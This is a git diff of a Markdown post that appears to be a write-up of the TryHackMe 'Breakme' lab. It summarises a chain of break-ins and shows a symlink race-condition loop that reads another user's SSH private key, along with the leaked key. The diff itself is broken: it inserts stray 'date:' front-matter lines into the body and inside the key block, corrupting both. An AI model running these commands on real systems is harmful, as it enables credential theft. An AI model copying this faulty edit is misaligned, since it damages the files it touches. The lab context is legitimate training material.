@@ -1,4 +1,5 @@
 ﻿---
+date: 2024-02-12 00:00:00 +0100
 title: 'TryHackMe - Breakme'
 author : Matty
 categories: [TryHackMe]
@@ -9,6 +10,7 @@ image:
   path: room_image.webp
 ---
 
+date: 2024-02-12 00:00:00 +0100
 Breakme started by discovering a WordPress installation and logging in through brute-forcing the credentials. After logging in, we exploited a vulnerability in an installed plugin, which allowed us to escalate our privileges, gain administrator access, and obtain a shell. Once we had a shell, we discovered an internal web application and exploited a command injection vulnerability there, escalating to another user. As this user, we were able to run a SUID binary belonging to another user that read files. Using a race condition vulnerability, we read the user's SSH key and escalated to that user. From there, we escaped a Python jail to gain root access.
 
 [![Tryhackme Room Link](/images/tryhackme_breakme/room_card.webp)](https://tryhackme.com/r/room/breakmenu){: .center }
@@ -413,12 +415,14 @@ john@Breakme:~$ while true; do touch file; sleep 0.3; ln -sf /home/youcef/.ssh/i
 [1] 54913
 john@Breakme:~$ while true; do out=$(/home/youcef/readfile file | grep -Ev 'Found|guess'| grep .);if [[ -n "$out" ]]; then echo -e "$out"; break; fi; done
 -----BEGIN OPENSSH PRIVATE KEY-----
+date: 2024-02-12 00:00:00 +0100
 b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCGzrHvF6
 Tuf+ZdUVQpV+cXAAAAEAAAAAEAAAILAAAAB3NzaC1yc2EAAAADAQABAAAB9QCwwxfZdy0Z
 ...
 g6a2xx9zV89mfWvuvrXDBX2VkdnvdvDHQRx+3SElSk1k3Votzw/q383ta6Jl3EC/1Uh8RT
 TabCXd2Ji/Y7UvM=
 -----END OPENSSH PRIVATE KEY-----
+date: 2024-02-12 00:00:00 +0100
 ```
 {: .wrap }
 
